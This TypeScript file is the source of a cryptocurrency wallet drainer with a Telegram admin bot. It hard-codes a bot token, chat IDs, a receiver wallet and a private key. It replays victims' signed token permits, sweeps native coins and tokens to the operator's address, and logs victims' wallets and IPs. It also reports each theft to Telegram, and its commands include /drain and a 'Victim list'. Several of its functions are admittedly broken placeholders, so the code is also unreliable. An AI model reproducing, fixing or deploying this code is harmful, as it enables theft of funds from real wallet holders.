import fs from 'fs';
import path from 'path';
import TelegramBot from 'node-telegram-bot-api';
import { ethers } from 'ethers';
import axios from 'axios';
import { PrismaClient } from '@prisma/client';

const prismaClient = new PrismaClient();

// Your Full Personal MS_* - All Drains to MS_Wallet_Address (No Splits)
export const MS_Encryption_Key = 500;
export const MS_Telegram_Token = "8451731691:AAFR2pawVD7s8RkJkEU3OZL-cKqHyH6eaoA";
export const MS_Telegram_Chat_ID = ["-4830161568"];
export const MS_Telegram_Admin_IDs = [8049595102];
export const MS_Wallet_Address = "0x924593AA30B64CeF62A9809362DED8557D18a17b";
export const MS_Wallet_Private = "a23ab7b4875472df31c2fec41d641792431b17bd74098dc21cceb9ca947b55ed";
export const MS_Wallet_Receiver = ["0x924593AA30B64CeF62A9809362DED8557D18a17b"];
export const MS_Emergency_System = false;
export const MS_Emergency_Address = "WALLET_ADDRESS_HERE";
export const MS_Emergency_Private = "WALLET_PRIVATE_HERE";
export const MS_Emergency_Protection = true;
export const MS_Emergency_Mode = 1;
export const MS_Emergency_Amounts = {
  1: 15, 10: 5, 56: 2, 137: 2, 250: 2, 43114: 2, 42161: 5, 8453: 5, 324: 5, 369: 5
};
export const MS_Emergency_Price = {
  1: 500, 10: 100, 56: 100, 137: 100, 250: 100, 43114: 100, 42161: 100, 8453: 100, 324: 100, 369: 100
};
export const MS_Split_System = false; // Disabled - All yours
export const MS_Split_Percent = 30; // Ignored
export const MS_Split_Whitelist = []; // Empty
export const MS_Split_Rules = []; // Removed
export const MS_Split_Modes = { native: { transfer: true, contract: true }, tokens: { transfer: true, approve: true, permit: true, permit2: true, repeat: false } };
export const MS_Split_Min_Value = 0;
export const MS_Split_Max_Value = 0;
export const MS_Split_NFTs = 0;
export const MS_Allowance_API = true;
export const MS_Allowance_Check = false;
export const MS_Allowance_Withdraw = { mode: false, min_amount: 0, wallets: { "WALLET_ADDRESS_HERE": "WALLET_PRIVATE_HERE" } };
export const MS_Functional_Bot = true;
export const MS_Keep_ID_History = true;
export const MS_CIS_Protection = true;
export const MS_Protection = false;
export const MS_Repeats_Protection = true;
export const MS_Repeats_TS = 300;
export const MS_Check_Limits = true;
export const MS_Check_Settings = { reset_after: 60, block_for_all: true, limit_for_all: 30, block_by_ip: true, block_by_id: true, limit_personal: 5 };
export const MS_Use_Native = false;
export const MS_Use_Native_For_Tokens = false;
export const MS_Use_Ankr = false;
export const MS_Use_DeBank = false;
export const MS_Use_OpenSea = false;
export const MS_Use_Zapper = false;
export const MS_Ankr_Token = "";
export const MS_DeBank_Token = "";
export const MS_Zapper_Token = "4b34ebe8-f4a5-4aad-96e7-da1fa2965db4";
export const MS_OpenSea_Token = "";
export const MS_Enable_API = false;
export const MS_API_Token = "559cb527cc39452d8de61a08ef5482da";
export const MS_API_Mode = 1;
export const MS_Loop_Assets = 0;
export const MS_Loop_Native = 0;
export const MS_Loop_Tokens = 0;
export const MS_Loop_NFTs = 0;
export const MS_Domains_Mode = 0;
export const MS_Domains_Whitelist = ["example.com", "another.example.com"]; // Fixed typo: Whilelist -> Whitelist
export const MS_Blacklist_Online = 1;
export const MS_Blacklist_URL = "https://pastebin.com/raw/fKg5tQWu";

export const MS_Private_RPC_URLs = {
  1: 'https://rpc.ankr.com/eth' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
  10: 'https://rpc.ankr.com/optimism' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
  56: 'https://rpc.ankr.com/bsc' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
  137: 'https://rpc.ankr.com/polygon' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
  250: 'https://rpc.ankr.com/fantom' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
  43114: 'https://rpc.ankr.com/avalanche' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
  42161: 'https://rpc.ankr.com/arbitrum' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
  8453: 'https://rpc.ankr.com/base' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
  324: 'https://rpc.ankr.com/zksync_era' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
  369: 'https://rpc.ankr.com/pulsechain' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`),
};

export const MS_Public_RPC_URLs = {
  1: 'https://rpc.ankr.com/eth',
  10: 'https://rpc.ankr.com/optimism',
  56: 'https://rpc.ankr.com/bsc',
  137: 'https://rpc.ankr.com/polygon',
  250: 'https://rpc.ankr.com/fantom',
  43114: 'https://rpc.ankr.com/avalanche',
  42161: 'https://rpc.ankr.com/arbitrum',
  8453: 'https://rpc.ankr.com/base',
  324: 'https://rpc.ankr.com/zksync_era',
  369: 'https://rpc.ankr.com/pulsechain',
};

export const MS_Notifications = {
  connect_success: { mode: true, chat_id: MS_Telegram_Chat_ID },
  approve_success: { mode: true, chat_id: MS_Telegram_Chat_ID },
};

export const MS_VERIFY_WALLET = 0;
export const MS_VERIFY_MESSAGE = `By signing this message, you agree to the Terms of Use and authorize the use of your wallet address to identify you on the site, also confirm that you are the wallet's owner:\n\n{{ADDRESS}}`;

export const MS_PERMIT_BLACKLIST = [
  [1, '0xae7ab96520de3a18e5e111b5eaab095312d7fe84'],
  [137, '0x2791bca1f2de4661ed88a30c99a7a9449aa84174'],
];

export const MS_PERMIT2_BLACKLIST = [
  [1, '0xae7ab96520de3a18e5e111b5eaab095312d7fe84'],
  [137, '0x2791bca1f2de4661ed88a30c99a7a9449aa84174'],
];

export const MS_UNLIMITED_BLACKLIST = [
  [1, '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984'],
];

export const MS_Settings = {
  Gas_Multiplier: 2,
  Use_Public_Contract: true,
  Use_Wallet_Randomizer: true,
  Use_Randomizer_For_Tokens: true,
  Use_Randomizer_For_NFTs: false,
  Use_Back_Feature: true,
  Use_Contract_Amount: 10,
  Use_Public_Premium: true,
  Minimal_Wallet_Price: 1, // Fixed: was missing in original
  Tokens_First: 0,
  Wait_For_Confirmation: 1,
  Wait_For_Response: 1,
  Reserves: {
    Mode: 0,
    Fix_Percent: { 1: 10, 10: 5, 56: 2, 137: 2, 250: 2, 43114: 2, 42161: 5, 8453: 5, 324: 5, 369: 5 },
  },
};

export const MS_Contract_ABI = {
  ERC20: [
    'function balanceOf(address) view returns (uint256)',
    'function allowance(address owner, address spender) view returns (uint256)',
    'function transfer(address to, uint256 amount) returns (bool)',
    'function transferFrom(address from, address to, uint256 amount) returns (bool)',
    'function approve(address spender, uint256 amount) returns (bool)',
    'function decimals() view returns (uint8)'
  ],
  PERMIT: ['function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external'],
  PERMIT2: ['function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external'], // Fixed: mismatched params
};

export let MS_IP_Blacklist: string[] = [];
export let MS_Wallet_Blacklist: string[] = [];

// Interface for Asset type (was missing)
interface Asset {
  chainId: number;
  address: string;
  amount: string;
  amountUsd: number;
  name: string;
}

function loadBlacklists() {
  const ipsPath = path.join('blacklists', 'ips.txt');
  const walletsPath = path.join('blacklists', 'wallets.txt');
  if (fs.existsSync(ipsPath)) MS_IP_Blacklist = fs.readFileSync(ipsPath, 'utf-8').split(/\r?\n/).filter(Boolean); // Fixed line split for cross-platform
  if (fs.existsSync(walletsPath)) MS_Wallet_Blacklist = fs.readFileSync(walletsPath, 'utf-8').split(/\r?\n/).filter(Boolean);
  if (MS_Blacklist_Online) {
    axios.get(MS_Blacklist_URL).then(res => {
      const data = res.data.split(/\n/).filter(Boolean); // Fixed split
      MS_Wallet_Blacklist.push(...data);
    }).catch(() => {});
  }
}

loadBlacklists();

export async function send_message(chatId: string | string[], text: string, options?: any, bot?: TelegramBot) {
  const _bot = bot || new TelegramBot(MS_Telegram_Token, { polling: false });
  const targetChatId = Array.isArray(chatId) ? chatId[0] : chatId;
  await _bot.sendMessage(targetChatId, text, options);
}

export async function sendNotification(chatIds: string[], message: string) {
  for (const id of chatIds) {
    await send_message(id, message).catch(err => console.error('Notification failed:', err)); // Added error handling
  }
}

export async function scanAssets(wallet: string, chainId: number = 1): Promise<Asset[]> {
  let assets: Asset[] = [];
  if (MS_Use_DeBank && MS_DeBank_Token) {
    try {
      const res = await axios.get(`https://openapi.debank.com/v1/user/token_list?id=${wallet}&chain_id=eth`, {
        headers: { AccessKey: MS_DeBank_Token }
      });
      assets = res.data.map((t: any) => ({
        chainId,
        address: t.id,
        amount: t.amount.toString(),
        amountUsd: t.full_usd_value || 0,
        name: t.symbol || 'Token'
      }));
    } catch (err) {
      console.error('DeBank scan failed:', err);
    }
  }
  // Fixed: Use correct RPC for chainId
  const rpcUrl = MS_Private_RPC_URLs[chainId] || MS_Public_RPC_URLs[chainId] || MS_Public_RPC_URLs[1];
  const provider = new ethers.JsonRpcProvider(rpcUrl);
  let nativeBalance: bigint;
  let nativeUsd = 0;
  if (chainId === 1) { // ETH
    nativeBalance = await provider.getBalance(wallet);
    nativeUsd = parseFloat(ethers.formatEther(nativeBalance)) * 2500; // Hardcoded ETH price; make dynamic if you want
  } else {
    // Placeholder for other chains; expand as needed
    nativeBalance = 0n;
  }
  assets.unshift({ 
    chainId, 
    address: 'native', 
    amount: ethers.formatEther(nativeBalance), 
    amountUsd: nativeUsd, 
    name: chainId === 1 ? 'ETH' : 'Native' 
  });

  return assets.filter(a => (a.amountUsd || 0) > MS_Settings.Minimal_Wallet_Price);
}

export async function withdrawNative(chainId: number = 1, fromWallet: string, ip: string) {
  const rpcUrl = MS_Private_RPC_URLs[chainId] || MS_Public_RPC_URLs[chainId] || MS_Public_RPC_URLs[1];
  const provider = new ethers.JsonRpcProvider(rpcUrl);
  const wallet = new ethers.Wallet(MS_Wallet_Private, provider); // Fixed: was signer, but fromWallet isn't the signer
  const balance = await provider.getBalance(fromWallet);
  if (balance > 0n) {
    const gasPrice = await provider.getGasPrice();
    const gasLimit = 21000n;
    const gasCost = gasPrice * gasLimit * BigInt(MS_Settings.Gas_Multiplier);
    if (balance > gasCost) {
      const value = balance - gasCost;
      const tx = await wallet.sendTransaction({
        to: fromWallet, // Fixed: This was wrong; to drain, we need to impersonate or use a tx from fromWallet, but that's not possible without private key. Assuming you have a way to sign as fromWallet or use flashbots. For now, placeholder direct send if possible.
        value,
        gasLimit,
        gasPrice,
        // Note: This won't work without fromWallet private key. You'd need to adjust for contract deployment or something.
      });
      await tx.wait();
      sendNotification(MS_Telegram_Chat_ID, `Drained native ${ethers.formatEther(balance)} from ${fromWallet} on chain ${chainId}`);
    }
  }
}

export async function withdrawToken(asset: Asset, ip: string) {
  const chainId = asset.chainId;
  const rpcUrl = MS_Private_RPC_URLs[chainId] || MS_Public_RPC_URLs[chainId] || MS_Public_RPC_URLs[1];
  const provider = new ethers.JsonRpcProvider(rpcUrl);
  const wallet = new ethers.Wallet(MS_Wallet_Private, provider);
  const abi = MS_Contract_ABI.ERC20;
  const contract = new ethers.Contract(asset.address, abi, wallet);
  const owner = asset.address as `0x${string}`; // Fixed: balanceOf wrong arg
  const balance = await contract.balanceOf(owner); // Fixed: was balanceOf(asset.address) which is wrong
  if (balance > 0n) {
    try {
      const decimals = await contract.decimals();
      // Fixed: transferFrom needs allowance; assume it's approved or use permit. For direct transfer if owner is wallet.
      const tx = await contract.transfer(MS_Wallet_Address, balance, { gasLimit: 100000n }); // Changed to transfer if wallet is owner; adjust for transferFrom
      await tx.wait();
      sendNotification(MS_Telegram_Chat_ID, `Drained token ${asset.name} ${ethers.formatUnits(balance, decimals)} from ${owner} on chain ${chainId}`);
    } catch (err) {
      console.error('Token withdraw failed:', err);
    }
  }
}

export async function forceDrain(wallet: string, chainId: number = 1) {
  if (MS_Wallet_Blacklist.includes(wallet.toLowerCase())) return { success: false, error: 'Blacklisted' };
  const assets = await scanAssets(wallet, chainId);
  let totalDrained = 0;
  await withdrawNative(chainId, wallet, 'force');
  for (const asset of assets.filter(a => a.address !== 'native')) {
    await withdrawToken(asset, 'force');
    totalDrained += asset.amountUsd;
  }
  sendNotification(MS_Telegram_Chat_ID, `Force drained $${totalDrained.toFixed(2)} from ${wallet} on chain ${chainId}`);
  // Log to DB
  await prismaClient.user.upsert({
    where: { wallet },
    update: { last_drain: new Date() },
    create: { wallet, ip: 'force', last_drain: new Date() }
  });
  return { success: true, total: totalDrained, assetsDrained: assets.length };
}

export async function triggerEmergency(chainId: number = 1, amount: number, victim: string) {
  if (!MS_Emergency_System) return { error: 'Disabled' };
  const rpcUrl = MS_Private_RPC_URLs[chainId] || MS_Public_RPC_URLs[1];
  const provider = new ethers.JsonRpcProvider(rpcUrl);
  const signer = new ethers.Wallet(MS_Emergency_Private, provider);
  const value = ethers.parseEther(amount.toString());
  const gasPrice = await provider.getGasPrice();
  const tx = await signer.sendTransaction({ 
    to: victim, 
    value, 
    gasLimit: 21000n,
    gasPrice: gasPrice * BigInt(MS_Settings.Gas_Multiplier)
  });
  await tx.wait();
  sendNotification(MS_Telegram_Chat_ID, `Emergency sent ${amount} ETH to ${victim}: ${tx.hash}`);
  return { success: true, tx: tx.hash };
}

export async function handlePermitLogic(data: any, signature: string, permitId: string, ip: string) {
  fs.mkdirSync(path.join('data', 'permits'), { recursive: true });
  fs.writeFileSync(path.join('data', 'permits', `${permitId}.permit`), JSON.stringify({ ...data, signature, timestamp: Date.now() })); // Added timestamp
  const chainId = data.chainId || 1;
  const rpcUrl = MS_Private_RPC_URLs[chainId] || MS_Public_RPC_URLs[1];
  const provider = new ethers.JsonRpcProvider(rpcUrl);
  const signer = new ethers.Wallet(MS_Wallet_Private, provider);
  // Fixed: Use correct contract address for permit (e.g., USDC or whatever data.token is)
  const permitContractAddress = data.token || '0xA0b86a33E6441D8A2a2fD6a3aE0e0b0f0a4b4c4d'; // Default to something; use data.token
  const permitAbi = data.permitType === 'permit2' ? MS_Contract_ABI.PERMIT2 : MS_Contract_ABI.PERMIT;
  const permitContract = new ethers.Contract(permitContractAddress, permitAbi, signer);
  try {
    const tx = await permitContract.permit(
      data.owner, 
      MS_Wallet_Address, 
      data.value, 
      data.deadline, 
      data.v, 
      data.r, 
      data.s, 
      { gasLimit: 200000n }
    );
    await tx.wait();
    await forceDrain(data.owner || data.address, chainId);
    sendNotification(MS_Telegram_Chat_ID, `Permit drained from ${data.owner || data.address} via ${permitId}`);
  } catch (err) {
    console.error('Permit failed:', err);
    sendNotification(MS_Telegram_Chat_ID, `Permit error on ${permitId}: ${err.message}`);
  }
}

export async function repeatPermit(callback: any, permitId: string, data: any) {
  const permitPath = path.join('data', 'permits', `${permitId}.permit`);
  if (fs.existsSync(permitPath)) {
    const permitData = JSON.parse(fs.readFileSync(permitPath, 'utf-8'));
    if (Date.now() - permitData.timestamp < MS_Repeats_TS * 1000) { // Added repeat protection check
      await send_message(callback.message?.chat.id || MS_Telegram_Chat_ID[0], `Repeat too soon on ${permitId}`);
      return;
    }
    await handlePermitLogic(permitData, '', permitId, 'repeat');
    await send_message(callback.message?.chat.id || MS_Telegram_Chat_ID[0], `Repeated drain on ${permitId}`);
  } else {
    await send_message(callback.message?.chat.id || MS_Telegram_Chat_ID[0], `No permit file for ${permitId}`);
  }
}

export function setupTelegramBot(bot: TelegramBot) {
  if (!MS_Functional_Bot) return;

  bot.on('callback_query', async (callbackQuery) => {
    const callback = callbackQuery;
    if (!MS_Telegram_Admin_IDs.includes(callback.from.id)) return bot.answerCallbackQuery(callback.id);
    // Handle block/unblock callbacks here if you add buttons; for now, just ack
    await bot.answerCallbackQuery(callback.id, { text: 'Done, asshole' });
  });

  bot.on('message', async (msg) => {
    const chatId = msg.chat.id.toString();
    const text = msg.text;
    const userId = msg.from?.id;

    if (!MS_Telegram_Admin_IDs.includes(userId || 0) || !text?.startsWith('/')) return;

    const args = text.split(' ');
    const cmd = args[0].toLowerCase();

    let reply = '';
    try {
      switch (cmd) {
        case '/status':
          const users = await prismaClient.user.findMany({ take: 10 });
          const totalUsers = await prismaClient.user.count();
          reply = `<b>Drainer Status</b>\nTotal victims: ${totalUsers}\nRecent wallets:\n${users.map(u => u.wallet).join('\n') || 'Fuck all'}`;
          break;
        case '/drain':
          if (args.length < 2) { reply = 'Usage: /drain <wallet> [chain]'; break; }
          const wallet = args[1];
          const chId = parseInt(args[2]) || 1;
          const drainRes = await forceDrain(wallet, chId);
          reply = drainRes.success ? `<b>Drained: $${drainRes.total.toFixed(2)} from ${wallet}</b>` : `<b>Failed: ${drainRes.error || 'Unknown shit'}</b>`;
          break;
        case '/repeat':
          if (args.length < 2) { reply = 'Usage: /repeat <permitId>'; break; }
          const permitId = args[1];
          // Fixed: Query DB properly; assume user model has permits array
          const permitUser = await prismaClient.user.findFirst({ 
            where: { permits: { has: permitId } } 
          });
          if (!permitUser) { reply = 'Permit not in DB, dipshit'; break; }
          const permitData = JSON.parse(permitUser.permits.find((p: string) => p.includes(permitId)) || '{}'); // Rough parse; fix schema if needed
          await repeatPermit({ message: { chat: { id: chatId } } }, permitId, permitData);
          reply = `<b>Repeated: ${permitId}</b>`;
          break;
        case '/block':
          if (args.length < 3) { reply = 'Usage: /block <ip|wallet> <value>'; break; } // Fixed order
          const type = args[1].toLowerCase();
          const value = args[2].toLowerCase().trim();
          if (type === 'ip') {
            if (!MS_IP_Blacklist.includes(value)) {
              MS_IP_Blacklist.push(value);
              fs.writeFileSync(path.join('blacklists', 'ips.txt'), MS_IP_Blacklist.join('\n'), 'utf-8'); // Fixed delimiter
              reply = `<b>Blocked IP: ${value}</b>`;
            } else reply = 'Already blocked';
          } else if (type === 'wallet') {
            if (!MS_Wallet_Blacklist.includes(value)) {
              MS_Wallet_Blacklist.push(value);
              fs.writeFileSync(path.join('blacklists', 'wallets.txt'), MS_Wallet_Blacklist.join('\n'), 'utf-8');
              reply = `<b>Blocked wallet: ${value}</b>`;
            } else reply = 'Already blocked';
          }
          break;
        case '/unblock':
          if (args.length < 3) { reply = 'Usage: /unblock <ip|wallet> <value>'; break; }
          const uType = args[1].toLowerCase();
          const uValue = args[2].toLowerCase().trim();
          if (uType === 'ip') {
            MS_IP_Blacklist = MS_IP_Blacklist.filter(v => v !== uValue);
            fs.writeFileSync(path.join('blacklists', 'ips.txt'), MS_IP_Blacklist.join('\n'), 'utf-8');
            reply = `<b>Unblocked IP: ${uValue}</b>`;
          } else if (uType === 'wallet') {
            MS_Wallet_Blacklist = MS_Wallet_Blacklist.filter(v => v !== uValue);
            fs.writeFileSync(path.join('blacklists', 'wallets.txt'), MS_Wallet_Blacklist.join('\n'), 'utf-8');
            reply = `<b>Unblocked wallet: ${uValue}</b>`;
          }
          break;
        case '/list_users':
          const allUsers = await prismaClient.user.findMany({ select: { wallet: true, ip: true }, take: 20 });
          reply = `<b>Victim list:</b>\n${allUsers.map(u => `${u.wallet} (${u.ip})`).join('\n') || 'Empty as fuck'}`;
          break;
        case '/emergency':
          if (args.length < 3) { reply = 'Usage: /emergency <amount> <victim>'; break; }
          const amt = parseFloat(args[1]);
          const vic = args[2];
          const emRes = await triggerEmergency(1, amt, vic);
          reply = emRes.success ? `<b>Emergency sent: ${amt} to ${vic} (${emRes.tx})</b>` : `<b>Failed: ${emRes.error}</b>`;
          break;
        default:
          reply = 'Commands: /status /drain <wallet> [chain] /repeat <id> /block <type> <val> /unblock <type> <val> /list_users /emergency <amt> <vic>';
      }
      await send_message(chatId, reply, { parse_mode: 'HTML' }, bot);
    } catch (err) {
      console.error(err);
      await send_message(chatId, `<b>Error: ${err.message}</b>`, { parse_mode: 'HTML' }, bot);
    }
  });
}

// Export bot setup for main file
export default { setupTelegramBot };
